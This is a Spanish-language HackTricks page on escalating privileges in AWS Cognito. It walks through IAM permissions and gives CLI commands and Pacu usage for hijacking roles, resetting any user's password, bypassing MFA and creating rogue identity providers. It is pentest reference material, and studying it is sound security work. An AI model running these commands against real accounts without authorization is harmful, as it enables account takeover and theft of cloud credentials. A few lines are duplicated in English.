# AWS - Escalada de Privilegios en Cognito

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## Cognito

Para obtener más información sobre Cognito, consulta:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Módulos de Pacu para pentesting y enumeración

[Pacu](https://github.com/RhinoSecurityLabs/pacu), el framework de explotación de AWS, ahora incluye los módulos "cognito__enum" y "cognito__attack" que automatizan la enumeración de todos los activos de Cognito en una cuenta y detectan configuraciones débiles, atributos de usuario utilizados para el control de acceso, etc., y también automatizan la creación de usuarios (incluido el soporte de MFA) y la escalada de privilegios basada en atributos personalizados modificables, credenciales de pool de identidades utilizables, roles asumibles en tokens de identidad, etc.

Para obtener una descripción de las funciones de los módulos, consulta la parte 2 de la [publicación del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para obtener instrucciones de instalación, consulta la página principal de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

### Uso

Uso de muestra de cognito__attack para intentar la creación de usuarios y todos los vectores de escalada de privilegios contra un pool de identidades y un cliente de pool de usuarios específicos:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Uso de muestra de cognito__enum para recopilar todas las piscinas de usuarios, clientes de piscinas de usuarios, piscinas de identidad, usuarios, etc. visibles en la cuenta actual de AWS:
```bash
Pacu (new:test) > run cognito__enum
```
### Herramienta "Cognito Scanner" para pentesting

[Cognito Scanner](https://github.com/padok-team/cognito-scanner) es una herramienta de línea de comandos en Python que implementa diferentes ataques en Cognito, incluyendo una escalada de privilegios.

#### Instalación
```bash
$ pip install cognito-scanner
```
#### Uso

#### Description
```bash
$ cognito-scanner --help
```
Para obtener más información, visita https://github.com/padok-team/cognito-scanner

### Recopilación de credenciales desde Identity Pool

Como Cognito puede otorgar credenciales de **roles IAM** tanto a usuarios **autenticados** como a usuarios **no autenticados**, si encuentras el **ID del Identity Pool** de una aplicación (que debería estar codificado en ella), puedes obtener nuevas credenciales y, por lo tanto, realizar una escalada de privilegios (dentro de una cuenta de AWS donde probablemente ni siquiera tenías ninguna credencial previamente).

Para obtener más información, [**consulta esta página**](../aws-unauthenticated-enum-access/#cognito).

**Impacto potencial:** Escalada directa a los roles de servicios adjuntos a usuarios no autenticados (y probablemente al que está adjunto a usuarios autenticados).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Con este permiso, puedes **otorgar cualquier rol de cognito** a los usuarios autenticados/no autenticados de la aplicación de Cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Si la aplicación de Cognito **no tiene habilitados los usuarios no autenticados**, es posible que también necesites el permiso `cognito-identity:UpdateIdentityPool` para habilitarlo.

**Impacto potencial:** Escalada directa de privilegios a cualquier rol de Cognito.

### `cognito-identity:update-identity-pool`

Un atacante con este permiso podría, por ejemplo, configurar un grupo de usuarios de Cognito bajo su control u otro proveedor de identidad donde pueda iniciar sesión como **forma de acceder a este grupo de identidades de Cognito**. Luego, simplemente **iniciar sesión** en ese proveedor de usuarios le permitirá **acceder al rol autenticado configurado en el grupo de identidades**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
También es posible **abusar de este permiso para permitir la autenticación básica**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Impacto potencial**: Comprometer el rol IAM autenticado configurado dentro del grupo de identidad.

### `cognito-idp:AdminAddUserToGroup`

Este permiso permite **agregar un usuario de Cognito a un grupo de Cognito**, por lo tanto, un atacante podría abusar de este permiso para agregar un usuario bajo su control a otros grupos con privilegios **mejores** o **diferentes roles IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Impacto potencial:** Escalada de privilegios a otros grupos de Cognito y roles de IAM adjuntos a los grupos de la piscina de usuarios.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Un atacante con estos permisos podría **crear/actualizar grupos** con **todos los roles de IAM que pueden ser utilizados por un proveedor de identidad de Cognito comprometido** y hacer que un usuario comprometido forme parte del grupo, accediendo a todos esos roles:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Impacto potencial:** Escalada de privilegios a otros roles IAM de Cognito.

### `cognito-idp:AdminConfirmSignUp`

Este permiso permite **verificar un registro**. Por defecto, cualquier persona puede registrarse en aplicaciones de Cognito. Si se deja así, un usuario podría crear una cuenta con cualquier dato y verificarla con este permiso.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Impacto potencial:** Escalada indirecta de privilegios al rol IAM del grupo de identidades para usuarios autenticados si se puede registrar un nuevo usuario. Escalada indirecta de privilegios a otras funcionalidades de la aplicación al poder confirmar cualquier cuenta.

### `cognito-idp:AdminCreateUser`

Este permiso permitiría a un atacante crear un nuevo usuario dentro del grupo de usuarios. El nuevo usuario se crea como habilitado, pero deberá cambiar su contraseña.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Impacto potencial:** Escalada de privilegios directa al rol IAM del grupo de identidades para usuarios autenticados. Escalada de privilegios indirecta a otras funcionalidades de la aplicación al poder crear cualquier usuario.

### `cognito-idp:AdminEnableUser`

Estos permisos pueden ser útiles en un escenario muy específico donde un atacante haya encontrado las credenciales de un usuario deshabilitado y necesite **habilitarlo nuevamente**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Impacto potencial:** Escalada indirecta de privilegios al rol IAM del grupo de identidades para usuarios autenticados y permisos del usuario si el atacante tuviera credenciales de un usuario deshabilitado.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Este permiso permite iniciar sesión con el [**método ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Para obtener más información, sigue el enlace.

### `cognito-idp:AdminSetUserPassword`

Este permiso permitiría a un atacante **cambiar la contraseña de cualquier usuario**, lo que le permitiría suplantar a cualquier usuario (que no tenga habilitada la autenticación multifactor).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Impacto potencial:** Escalada de privilegios directa a potencialmente cualquier usuario, lo que permite acceder a todos los grupos de los que cada usuario es miembro y acceder al rol IAM autenticado del Identity Pool.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Un atacante podría potencialmente abusar de este permiso para establecer un teléfono móvil bajo su control como **SMS MFA de un usuario**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Similar to the previous one this permission can be used to set MFA preferences of a user to bypass the MFA protection.

**SetUserMFAPreference:** Al igual que el anterior, este permiso se puede utilizar para establecer las preferencias de MFA de un usuario y eludir la protección de MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Similar to the previous one this permission can be used to set MFA preferences of a user pool to bypass the MFA protection.

**SetUserPoolMfaConfig**: Similar a la anterior, este permiso se puede utilizar para establecer las preferencias de MFA de un grupo de usuarios y así evitar la protección de MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** También es posible actualizar el grupo de usuarios para cambiar la política de MFA. [Ver cli aquí](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Impacto Potencial:** Escalada indirecta de privilegios que podría afectar a cualquier usuario cuyas credenciales conozca el atacante, lo que permitiría evadir la protección de MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Un atacante con este permiso podría cambiar el correo electrónico, número de teléfono u otro atributo de un usuario bajo su control para intentar obtener más privilegios en una aplicación subyacente.\
Esto permite cambiar un correo electrónico o número de teléfono y establecerlo como verificado.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Impacto potencial:** Posible escalada indirecta de privilegios en la aplicación subyacente utilizando Cognito User Pool que otorga privilegios basados en atributos de usuario.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Un atacante con este permiso podría **crear un nuevo Cliente de User Pool menos restringido** que los clientes de pool existentes. Por ejemplo, el nuevo cliente podría permitir cualquier tipo de método de autenticación, no tener ningún secreto, tener la revocación de tokens desactivada, permitir que los tokens sean válidos por un período más largo...

Lo mismo se puede hacer si en lugar de crear un nuevo cliente, se **modifica uno existente**.

En la [**línea de comandos**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (o en la [**actualización**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) puedes ver todas las opciones, ¡compruébalo!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Impacto potencial:** Posible escalada indirecta de privilegios al usuario autorizado del grupo de identidades utilizado por el grupo de usuarios, mediante la creación de un nuevo cliente que relaje las medidas de seguridad y permita a un atacante iniciar sesión con un usuario que haya podido crear.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Un atacante podría abusar de este permiso para crear usuarios mediante la carga de un archivo CSV con nuevos usuarios.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(En el caso de que crees un nuevo trabajo de importación, es posible que también necesites el permiso iam passrole, aún no lo he probado).

**Impacto potencial:** Escalada de privilegios directa al rol IAM del grupo de identidades para usuarios autenticados. Escalada de privilegios indirecta a otras funcionalidades de la aplicación al poder crear cualquier usuario.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Un atacante podría crear un nuevo proveedor de identidad para luego poder **iniciar sesión a través de este proveedor**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Impacto potencial:** Escalada de privilegios directa al rol IAM del grupo de identidades para usuarios autenticados. Escalada de privilegios indirecta a otras funcionalidades de la aplicación al poder crear cualquier usuario.

### Análisis de cognito-sync:\*

Este es un permiso muy común por defecto en los roles de Cognito Identity Pools. Aunque un comodín en los permisos siempre parece malo (especialmente viniendo de AWS), los **permisos otorgados no son muy útiles desde la perspectiva de un atacante**.

Este permiso permite leer la información de uso de los grupos de identidades y los IDs de identidad dentro de los grupos de identidades (que no es información sensible).\
Los IDs de identidad pueden tener [**conjuntos de datos**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API_Dataset.html) asignados a ellos, que son información de las sesiones (AWS lo define como un **juego guardado**). Es posible que esto contenga algún tipo de información sensible (pero la probabilidad es bastante baja). Puedes encontrar en la [**página de enumeración**](../aws-services/aws-cognito-enum/) cómo acceder a esta información.

Un atacante también podría usar estos permisos para **inscribirse en un flujo de Cognito que publique cambios** en estos conjuntos de datos o en una **función lambda que se active en eventos de Cognito**. No he visto que esto se utilice, y no esperaría encontrar información sensible aquí, pero no es imposible.

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, ¡consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
